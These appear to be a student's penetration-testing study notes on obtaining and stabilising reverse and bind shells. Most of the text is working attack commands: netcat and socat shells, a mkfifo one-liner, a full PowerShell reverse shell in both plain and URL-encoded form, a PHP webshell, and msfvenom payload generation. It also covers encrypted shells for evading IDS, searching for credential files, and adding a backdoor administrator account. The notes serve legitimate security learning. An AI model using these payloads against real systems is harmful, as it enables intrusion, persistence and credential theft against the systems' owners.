[] What is shell?
	- Shells are the when using CLI to control some machine, in Linux there is bash , sh programs , in windows threre is cmd.exe and powershell.
	- When we force the remote server to send us a remote CLI access tot the server (reverse shell), but when we open a port on the server which we can connect to execute commands(bind shell) 

[] Tools
	- there are varity of tools ro reveive reverse shell or to send a bind shell
		1. netcat => can be used to receive revers sehlls and to connect to reomte port attached to a bind shell, netcat shell is unstable(easy to loss)
		2. socat => the same as netcat but it is more stable and has much to do, its commands are difficult, not installed by default in linux distros like netcat
	- both netcat and socat have .exe versions
		3. Metasploit_multi/handler => more stable , can handel staged payloads
		4. msfvenom => much powerful tool to genertae paylods
	- Online sells payloads =>		^^`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`
	^^`https://pentestmonkey.net/`

[] Types of shell:
	1. reverse shell => this needs to configure your network to recevie the shell, cannot be prevented byy the firewall
		%% for example
		%% on the attacking machine => 	`sudo nc -nlvp 4444`
		%% on the target machine => `nc <local-ip> 4444 -e /bin/bash`
	2. bind shell => firewall can prevent it
		%% for example
		%% on the attacking machine => nc <target_ip> <port>
		%% on the target machine => nc -nlvp <port> -e "cmd.exe"

-			 revers shell	| bind shell
-------------------------------------------				
Listener	| atacker		| target
			|				| 
-------------------------------------------							
connect		|	target		| attacker
			|				|


	- Interactive shell => powershell, bash, zsh , sh are all an interactive shells, that enable you to interact with the program after executing it
	- non-interactive shell => like netcat shell, you are limited to use programs which do not need any user interaction to run properly 

	- interactive commands => ssh , telnet
	- non-interactive commands => whoami, cd , cat , id , ifconfig
	- when exeuting an interactive program in a non-interactive shell, the we have no output appeared in the scereen, but it goes somewhere.
	- where does the output go? => in logs i guess
	- `listener` => `sudo rlwrap nc -lvnp 443`

[] Netcat:
	# To obtain reverse shell
	- used to open listener prot => `nc -nlvp <port_num>`
		-l => listen
		-v => verbose the output
		-n => no hostnames resolving
		-p => specify port number
	- note that when you want to listen in port below 1024 you will need to run the command as sudo 
	- try use known ports (80, 443, 53,..etc) 
	# To obtain bind shell
	- assume we managed to open a port that give a shell in the target system , so now we wannna conneat to it using our attacking machine `nc <target-ip> <port>`

[] Netcat shell Stabilisation:
	- after having a shell on the target macine using netcat(non-interacvtive shell)
	- netcat shell is unstable, so how to make it more stable?
		# First Technique using python
			- this moethod is often used in linux targeted systems as python is installed by default, to make the shell more stable it takes 3 steps 
				1. use this command `python -c 'import pty;pty.spwan("/bin/bash")'` => to make the shell similer to linux shell, if it is not workin, try python2 or python3
				2. use this command `export TERM=xterm` => to export commands like clear
				3. till now, what we did can be killed easily by clicking ctrl+c, if we want to make this not happens, we first ctrl+z to bg the shell then we turned of ctrl+c from our own shell using `stty raw -echo; fg`, it aslo give us the tab autocompletion
		# Second Technique using rlwrap
			- rlwrap is a small program we can say, which give us access to history, tab autocompletion and the arrow keys, its useful for windows `rlwrap nc -nlvp <listener port>`
		#Third Technique using socat:
			- using socat to have a stable shell in linux targets needs at first to have a netcat shell so we can move socat comppiled binaries to the target machine, we can do it by ryynning python3 webserver on our attacking machine.
				%% Download thd socat file in folder =>`https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true`
				%% on the attacking machine we cd to the same directory where the socat file exist => `sudo python3 -m http.server 80`
				%% on the target machime after having a netcat shell => `wget <attach_ip>/socat -O /tmp/socat`

[] Socat:
	- socat syntax is much harder than that in netcat 
	%% reverse shell %%
	- to lestin in a port => `socat TCP-L:<port>`
	- to connect using windows=> `socat TCP:<ip>:<port> EXEC:powershell.exe.pipes`
	- pipes => to force poweshell.exe or cmd.exe to use unix style
	- to connect using linux => `socat TCP:<ip>:<port> EXCE:"bash -li"`
	%% bind shell %%
	- Linux => in the target machine we open the port with bash running on it `socat TCP-L:<port> EXEC:"bash -li"`
	- Windows => in the target mmachine we open the port with powershell or cmd run on it `socat TCp-L:<port> EXEC:powershell.exe,pipes`
	- in the attacking machine we use => `socat TCP:<ip>:<port> -`
	# Stable shell
		%lestiner%
		- to start a stable reverse shell we can use this command => `socat TCP-L:<port> FILE:`tty`,raw,echo=0 `
		%connect%
		- `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

		    - pty, allocates a pseudoterminal on the target -- part of the stabilisation process
    		- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
    		- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
    		- setsid, creates the process in a new session
    		- sane, stabilises the terminal, attempting to "normalise" it.

    	- Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, 
    	which will let us use text editors such as Vim or Nano.

 [] Socat Encrypted Shell:
 	{} why we use encrypted shell?
 		-as is cannot be spied and also can bypass the IDS.
 	{} in order to use encrypted shells we first mmust generate an ssl certificate
 	{} we generate a cert using => `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
 		- this command above create two files `shell.key` and `shell.crt`. we need to merge these two files using => `cat shell.key shell.crt > shell.pem`	
 	{} after generating our cert, now we cat set up our reverse shell by just replacing `TCP` with `openssl` in socat commands like this => `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
     	- and to connect back => `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

[] Common Shell Payloads
	- in bind shell we can lestin using `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` for more stable shells, or we can just use 	=> `nc -nlvp <port> -e /bin/bash` 
	- a very simmiler command is used for reverse shell => `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\
	- this one line command is used to obtain a revers shell using powershell => `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

	- form more payloads for allm things => `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`


[] msfvenom:
	{} what is msfvenom?
		- is a tool to generate all kinds of payloads with various formates such as (.exe,.war,.pyy.aspx,...and more).
		- the standerd command is => `msfvenom -p <payload> <options>`
		- for example
				`msfvenom -p windows/x64/shell/revers_tcp -f exe -o /home/Desktop/shell.exe LHOST=<atacker_IP> LPORT=<lestiner_port>`
				lets break this command down and explain each options functionality:
					-f => formate
					-o => the path and the payload filename
					LHOST => the attacker_IP 
					LPORT => the lestiner_port
	{} Stageed Vs Stageless reverse shell payloads
		- staged payloads consistes of two piecies of code, the first small one called the stager,when the stager is executeed in the target system  it connects back to the lestiner port but with out any shell, then after the connection between the attacker and the victem is established the second part of the code will be executed and give back the shell.
		- stageless payloads => the very common payloads used, consists of one piece of code and is often large so it can easier be detected using the anti-virus and IDS  

	{} The naming system for msfvenom => <OS>/<arch>/<payload> e.g.)> linux/x86/shell_reverse_tcp for x86 linux targets
		- windows 32-bit is an exeption, no arch => windows/shell_reverse_tcp 
		- for win 64-bit => the arch would be x64
		- what is the differnce between, shell_reverse_tcp & shell/reverse_tcp
			shell_reverse_tcp is a stageless paylaod
			shell/reverse_tcp is a stagged paylaod
		- windows staged meterpreter payload would looks like => `windows/x64/meterpreter/reverse_tcp` 
		- a linux stageless meterpreter payload would looks like => `linux/x86/meterpreter_reverse_tcp`
		- you can list the whole msfvenom payloads using => `msfvenom --list payloads`

	{} for example you want to search for a windows 64bit meterpreter paylaod
					`msfvenom --list payloads | grep windows/x64/meterpreter`


[] Matasploit multi/handler:
	- we saw it in the metasploit module in detail


[] WebShells:
	- sometimes websites allaows the users to upload files, we can upload a php shell file contains => 
			`<?php "pre" . shell_exec($_GET["cmd"] . "<pre"; ?> `
			and execute commans after file.php?cmd=<command> in the URL
	- for linux based websevers we can use reverse shell in kali `/usr/share/webshells` or those in pentestMonkey => `https://pentestmonkey.net/`
	- these shell payloads won't if the target is windows based so we need to use =>
			`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.14.61.155%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

[] Next Steps:
	- we have a shell, then what?
		{-} after having a shell we then need to stablize it, we can try some command such `python3 -c 'import pty;pty.spawn("/bin/bash")'` or we can search in /home/<user>/.ssh for id_rsa and login as a known users or we can try dirtycow exploits =>	`https://dirtycow.ninja/` 

		{-} On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for 	example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 		or C:\xampp\FileZilla Server\FileZilla Server.xmlOn Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
		 or C:\xampp\FileZilla Server\FileZilla Server.xml

		{-} Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

		The syntax for this is as follows:

		net user <username> <password> /add

		net localgroup administrators <username> /add